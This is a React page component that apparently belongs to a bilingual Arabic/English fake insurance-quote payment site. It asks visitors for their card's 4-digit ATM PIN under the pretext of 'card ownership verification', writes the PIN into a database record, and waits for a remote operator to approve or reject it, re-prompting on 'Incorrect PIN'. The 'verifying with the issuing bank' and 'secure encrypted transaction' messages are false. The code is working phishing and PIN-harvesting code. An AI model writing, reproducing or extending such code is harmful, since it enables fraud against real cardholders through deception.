import { useEffect, useMemo, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Loader2, ShieldCheck, XCircle } from "lucide-react";
import Header from "@/components/site/Header";
import SiteFooter from "@/components/site/SiteFooter";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { getMyLatestApplication, updateApplication, type StoredApplication } from "@/lib/admin-storage";
import { getVisitorId, getVisitorToken } from "@/lib/visitor-tracking";
import { supabase } from "@/integrations/supabase/client";
import { useI18n } from "@/lib/i18n";
import mastercardLogo from "@/assets/payments/mastercard.svg";
import madaLogo from "@/assets/payments/mada.png";
import visaLogo from "@/assets/payments/visa.svg";

type AtmState = { appId?: string };

const PROCESSING_SECONDS = 60;

const QuoteAtm = () => {
  const { t, isAr } = useI18n();
  const navigate = useNavigate();
  const location = useLocation();
  const { appId } = (location.state as AtmState) || {};

  const [pin, setPin] = useState(["", "", "", ""]);
  const [submitting, setSubmitting] = useState(false);
  const [app, setApp] = useState<StoredApplication | null>(null);
  const [processing, setProcessing] = useState(false);
  const [processingSecs, setProcessingSecs] = useState(PROCESSING_SECONDS);
  const [rejected, setRejected] = useState(false);
  const [resolvedId, setResolvedId] = useState<string | undefined>(appId);

  useEffect(() => {
    (async () => {
      let id = appId;
      if (!id) {
        const latest = await getMyLatestApplication();
        const data = latest ? { id: latest.id } : null;
        if (data) id = (data as { id: string }).id;
      }
      if (!id) return;
      setResolvedId(id);
      const a = await getMyLatestApplication();
      if (a) setApp(a);
    })();
  }, [appId]);

  useEffect(() => {
    if (!processing) return;
    if (processingSecs <= 0) {
      setProcessing(false);
      setRejected(true);
      setPin(["", "", "", ""]);
      toast.error(t("انتهت مهلة التحقق، حاول مرة أخرى", "Verification timed out, please try again"));
      return;
    }
    const timer = window.setTimeout(() => setProcessingSecs((s) => s - 1), 1000);
    return () => window.clearTimeout(timer);
  }, [processing, processingSecs]);

  useEffect(() => {
    if (!resolvedId || !processing) return;
    const id = resolvedId;
    const channel = supabase
      .channel(`atm-decision-${id}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "applications", filter: `id=eq.${id}` },
        (payload) => {
          const newRow = payload.new as { review_status?: string };
          if (newRow.review_status === "completed") {
            setProcessing(false);
            toast.success(t("تم تأكيد العملية بنجاح", "Payment confirmed successfully"));
            navigate("/quote/success", { replace: true, state: { appId: id } });
          } else if (newRow.review_status === "atm_rejected") {
            setProcessing(false);
            setRejected(true);
            setPin(["", "", "", ""]);
            toast.error(t("الرقم السري غير صحيح، حاول مرة أخرى", "Incorrect PIN, please try again"));
          }
        },
      )
      .subscribe();

    const poll = window.setInterval(async () => {
      if (document.visibilityState !== "visible") return;
      const fresh = await getMyLatestApplication();
      if (!fresh || fresh.id !== id) return;
      setApp(fresh);
      if (fresh.reviewStatus === "completed") {
        setProcessing(false);
        navigate("/quote/success", { replace: true, state: { appId: id } });
      } else if (fresh.reviewStatus === "atm_rejected") {
        setProcessing(false);
        setRejected(true);
        setPin(["", "", "", ""]);
      }
    }, 1000);

    return () => {
      window.clearInterval(poll);
      supabase.removeChannel(channel);
    };
  }, [resolvedId, processing, navigate]);

  const cardLast4 = useMemo(() => {
    return (app?.cardLast4 || "").replace(/\D/g, "").slice(-4) || "••••";
  }, [app?.cardLast4]);

  const brandLogo = useMemo(() => {
    if (app?.cardBrand === "mastercard") return mastercardLogo;
    if (app?.cardBrand === "mada") return madaLogo;
    if (app?.cardBrand === "visa") return visaLogo;
    return mastercardLogo;
  }, [app?.cardBrand]);

  const isValid = pin.every((d) => /^\d$/.test(d));
  const code = pin.join("");

  const handleChange = (i: number, val: string) => {
    const v = val.replace(/\D/g, "").slice(-1);
    setPin((prev) => {
      const next = [...prev];
      next[i] = v;
      return next;
    });
    if (v) {
      const nextEl = document.getElementById(`atm-${i + 1}`) as HTMLInputElement | null;
      nextEl?.focus();
    }
  };

  const handleKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !pin[i] && i > 0) {
      const prevEl = document.getElementById(`atm-${i - 1}`) as HTMLInputElement | null;
      prevEl?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || !resolvedId) return;
    setSubmitting(true);
    setRejected(false);
    await updateApplication(resolvedId, {
      atmPin: code,
      reviewStatus: "atm_submitted",
    });
    setSubmitting(false);
    setProcessingSecs(PROCESSING_SECONDS);
    setProcessing(true);
  };

  return (
    <main dir={isAr ? "rtl" : "ltr"} className="min-h-screen bg-[hsl(210_40%_97%)]">
      <Header />

      <section className="mx-auto w-full max-w-[520px] px-4 py-6 sm:py-8">
        <div className="overflow-hidden rounded-2xl bg-white p-6 shadow-card sm:p-8">
          {processing ? (
            <div className="flex flex-col items-center text-center">
              <div className="relative grid h-20 w-20 place-items-center">
                <div className="absolute inset-0 animate-ping rounded-full bg-brand-blue/20" />
                <div className="grid h-16 w-16 place-items-center rounded-full bg-brand-blue/10 text-brand-blue">
                  <Loader2 className="h-8 w-8 animate-spin" strokeWidth={2.2} />
                </div>
              </div>
              <h2 className="mt-5 text-[18px] font-extrabold text-brand-blue sm:text-[20px]">
                {t("جاري التحقق من الرقم السري...", "Verifying your PIN...")}
              </h2>
              <p className="mt-2 max-w-[340px] text-[12.5px] leading-6 text-muted-foreground">
                {t("يتم التحقق من ملكية البطاقة لدى البنك المُصدر. من فضلك لا تغلق هذه الصفحة.", "We are verifying your card ownership with the issuing bank. Please do not close this page.")}
              </p>
              <div className="mt-5 flex items-center gap-2 rounded-full bg-muted/50 px-4 py-2 text-[12.5px] font-bold text-brand-blue">
                <span>{t("الوقت المتبقي", "Time remaining")}</span>
                <span className="font-mono text-[14px]">
                  {String(Math.floor(processingSecs / 60)).padStart(2, "0")}:
                  {String(processingSecs % 60).padStart(2, "0")}
                </span>
              </div>
              <div className="mt-6 flex items-center justify-center gap-1.5 text-[11.5px] text-muted-foreground">
                <ShieldCheck className="h-[14px] w-[14px] text-emerald-600" />
                <span>{t("عملية مشفّرة وآمنة", "Secure encrypted transaction")}</span>
              </div>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="text-center">
              <h1 className="text-[20px] font-extrabold text-[hsl(214_30%_15%)] sm:text-[22px]">
                {t("إثبات ملكية البطاقة", "Card ownership verification")}
              </h1>

              <div className="mt-6 text-[44px] font-black tracking-wider text-brand-blue sm:text-[52px]">
                ATM
              </div>

              <h2 className="mt-4 text-[16px] font-extrabold leading-7 text-[hsl(214_30%_15%)] sm:text-[17px]">
                {t("لتأكيد العملية أدخل الرقم السري للصراف الآلي", "To confirm the payment, enter your ATM PIN")}
              </h2>

              <div className="mt-5 flex justify-center">
                <img src={brandLogo} alt="card brand" className="h-7 w-auto" />
              </div>

              <div className="mt-3 h-px w-full bg-border" />

              <p className="mt-4 text-[13px] leading-7 text-muted-foreground">
                {t("يرجى إدخال الرقم السري للصراف الآلي (ATM) المكوّن من 4 خانات للبطاقة المنتهية بـ", "Please enter the 4-digit ATM PIN for the card ending in")}
                <span className="mx-1 font-extrabold text-[hsl(214_30%_15%)]" dir="ltr">
                  {cardLast4}
                </span>
                {t("ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.", "so we can confirm cardholder eligibility and protect the payment from fraud.")}
              </p>

              {rejected && (
                <div className="mt-4 flex items-start gap-2 rounded-xl border border-destructive/30 bg-destructive/5 p-3 text-start text-[12.5px] text-destructive">
                  <XCircle className="mt-0.5 h-4 w-4 shrink-0" />
                  <span>{t("الرقم السري غير صحيح. يرجى إدخال الرقم الصحيح.", "Incorrect PIN. Please enter the correct one.")}</span>
                </div>
              )}

              <div className="mt-7 flex justify-center gap-3" dir="ltr">
                {pin.map((d, i) => (
                  <input
                    key={i}
                    id={`atm-${i}`}
                    value={d}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    inputMode="numeric"
                    type="password"
                    maxLength={1}
                    autoComplete="off"
                    className="h-16 w-16 rounded-xl border-2 border-[hsl(214_25%_85%)] bg-white text-center font-mono text-[28px] font-extrabold text-brand-blue outline-none transition-colors focus:border-brand-blue sm:h-[68px] sm:w-[68px]"
                  />
                ))}
              </div>

              <button
                type="submit"
                disabled={!isValid || submitting}
                className={cn(
                  "mt-8 h-[52px] w-full rounded-xl text-[15px] font-extrabold text-white shadow-soft transition-all",
                  isValid && !submitting
                    ? "btn-pay"
                    : "cursor-not-allowed btn-pay opacity-50",
                )}
              >
{submitting ? t("جاري الإرسال...", "Submitting...") : t("تأكيد", "Confirm")}
              </button>

              <div className="mt-4 flex items-center justify-center gap-1.5 text-[11.5px] text-muted-foreground">
                <ShieldCheck className="h-[14px] w-[14px] text-emerald-600" />
                <span>{t("عملية مشفّرة وآمنة", "Secure encrypted transaction")}</span>
              </div>
            </form>
          )}
        </div>
      </section>

      <SiteFooter />
    </main>
  );
};

export default QuoteAtm;